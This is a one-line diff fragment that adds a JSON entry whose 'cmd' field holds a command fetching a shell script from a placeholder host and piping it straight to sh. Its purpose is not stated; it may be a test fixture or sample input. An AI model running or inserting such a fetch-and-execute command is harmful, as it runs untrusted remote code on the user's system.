@@ -1,0 +1,1 @@
+{"cmd":"curl http://example.invalid/x.sh | sh"}
